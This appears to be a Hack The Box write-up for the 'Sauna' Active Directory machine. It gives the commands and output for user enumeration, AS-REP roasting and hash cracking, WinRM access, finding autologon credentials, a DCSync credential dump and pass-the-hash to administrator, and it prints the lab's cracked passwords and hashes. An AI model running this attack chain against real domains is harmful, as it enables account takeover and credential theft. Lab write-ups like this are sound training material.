
![logo sauna](Images/logo%20sauna.png)


# Attack Chain

```
Website /about.html → user list → username-anarchy → kerbrute
└─► VALID: fsmith
    └─► AS-REP Roasting (DONT_REQ_PREAUTH) → hashcat -m 18200 → Thestrokes23
        └─► WinRM as fsmith  [user]
            └─► BloodHound: svc_loanmgr has DS-Replication-Get-Changes(-All)
                └─► WinPEAS → AutoLogon creds
                    └─► DCSync → Administrator NThash
                        └─► PtH WinRM as administrator  [root]
```

# Summary

- [Enumeration](#enumeration)
	- [nmap](#nmap)
	- [SMB](#smb)
	- [Web](#web)
- [Users Discovery](#users-discovery)
- [ASREPRoasting](#asreproasting)
	- [Request an AS-REP](#request-an-as-rep)
	- [Crack the hash](#crack-the-hash)
- [Shell as fsmith](#shell-as-fsmith)
- [Bloodhound](#bloodhound)
- [Autologon Credentials](#autologon-credentials)
- [DCSync](#dcsync)
- [Shell as administrator](#shell-as-administrator)

---
# Enumeration

### nmap

Let's perform a ports scan on the target.

```
nmap -sVC 10.129.*.* -oA nmap

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-08 16:20:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

> [!NOTE]
> **Observations**
> - Target is an Active Directory
> - domain is `EGOTISTICAL-BANK.LOCAL`
> - FQDN : `SAUNA.EGOTISTICAL-BANK.LOCAL`

We can add these entries to our `/etc/hosts` file

```
echo '10.129.*.* SAUNA SAUNA.EGOTISTICAL-BANK.LOCAL EGOTISTICAL-BANK.LOCAL' | sudo tee -a /etc/hosts
```

### SMB

Next we can test if NULL session is enabled.

```
nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u '' -p ''

SMB         10.129.*.*   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
```

It is enabled, however we can't access the shares of the target.

```
nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u '' -p '' --shares

SMB         10.129.*.*   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
SMB         10.129.*.*   445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

The user `guest` is also disabled

### Web

Let's head onto the website.

![web - sauna](Images/web%20-%20sauna.png)

We are landing on the company website, and we can find the team members under the page `/about.html`.

![team members - sauna](Images/team%20members%20-%20sauna.png)

# Users Discovery

With the discovery of the team members, we can craft a user list out of it.

```
cat users.txt

Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```

And we can use [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to transform our list into multiple username structures so we can brute force the users and find valid ones.

```
./username-anarchy -i users.txt > test_list.txt
```

Then we can use the tool [Kerbrute](https://github.com/ropnop/kerbrute) with that wordlist and see which users are valid inside the target.

```
kerbrute userenum -d "EGOTISTICAL-BANK.LOCAL" --dc "SAUNA.EGOTISTICAL-BANK.LOCAL" test_list.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/08/26 - Ronnie Flathers @ropnop

2026/07/08 05:40:46 >  Using KDC(s):
2026/07/08 05:40:46 >  	SAUNA.EGOTISTICAL-BANK.LOCAL:88

2026/07/08 05:40:46 >  [+] VALID USERNAME:	 fsmith@EGOTISTICAL-BANK.LOCAL
```

The user `fsmith` exists on the target, let's put the entry inside a file we can call `valid_users.txt`.

# ASREPRoasting

Now that we have a valid username, we can try to perform an **ASREPRoasting** attack, which consists of targeting users with **DONT_REQ_PREAUTH**, which lets us request an AS-REP without pre-authentication. 
The response contains an encrypted blob sealed with a key derived from the user's password, which we can crack offline.

### Request an AS-REP

```
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/'' -no-pass -dc-host SAUNA.EGOTISTICAL-BANK.LOCAL -usersfile valid_users.txt -outputfile asrep.txt

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTISTICAL-BANK.LOCAL:<hash>
```

We successfully retrieved the ASREP hash of `fsmith`.

We can also use `NetExec` to do the attack.

```
nxc ldap SAUNA.EGOTISTICAL-BANK.LOCAL -u valid_users.txt -p '' --asreproast asrep.txt

LDAP        10.129.*.*   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.*.*   389    SAUNA            $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTISTICAL-BANK.LOCAL:<hash>
```

### Crack the hash

Let's crack the hash now with `hashcat`.

```
hashcat asrep.txt /usr/share/wordlists/rockyou.txt

<SNIP>

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTISTICAL-BANK.LOCAL:<hash>:Thestrokes23

<SNIP>
```

The hash has been cracked, and we have `fsmith`'s password : `Thestrokes23`.

Let's check if the account is valid.

```
nxc smb sauna -u 'fsmith' -p 'Thestrokes23'

SMB         10.129.*.*   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
```

# Shell as fsmith

Since we have valid credentials, we can try to see if we can connect over winRM.

```
nxc winrm sauna -u 'fsmith' -p 'Thestrokes23'
WINRM       10.129.*.*   5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) 
WINRM       10.129.*.*   5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```

Indeed we can.

```
evil-winrm -u fsmith -p Thestrokes23 -i SAUNA.EGOTISTICAL-BANK.LOCAL

*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```

The user flag can be retrieved from here inside `C:\Users\fsmith\Desktop`.

# Bloodhound

We can now collect data of the target domain with `bloodhound`.

```
bloodhound.py -d 'EGOTISTICAL-BANK.LOCAL' -u 'fsmith' -p 'Thestrokes23' -ns '10.129.*.*'
```

Unfortunately, `fsmith` don't have many privileges.

But when running the request **Shortest Path to High Value Targets** we notice that `svc_loanmgr` has interesting privileges over the domain.

![svc_loanmgr ACLs](Images/svc_loanmgr%20ACLs.png)

# Autologon Credentials

Running a **WinPEAS** scan on the target reveals autologon credentials.

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64.exe

<SNIP>

Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

<SNIP>
```

The username looks like the account we saw from **Bloodhound**, let's check if the password belongs to `svc_loanmgr`.

```
nxc smb sauna -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'

SMB         10.129.*.*   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.*.*   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! 
```

> [!TIP]
> **New credentials found**
> `svc_loanmgr` : `Moneymakestheworldgoround!`

# DCSync

With our newly compromised user, we can perform a **DCSync** attack and retrieve every domain user's NTLM hash.

Here we target the `administrator` account specifically.

```
secretsdump.py 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@'SAUNA.EGOTISTICAL-BANK.LOCAL' -just-dc-user "administrator"


[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up... 
```

# Shell as administrator

We can now connect over winRM as `administrator`.

```
evil-winrm -i 'SAUNA.EGOTISTICAL-BANK.LOCAL' -u administrator -H '823452073d75b9d1cf70ebdf86c7f98e'

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

> [!TIP]
> **Machine Rooted**

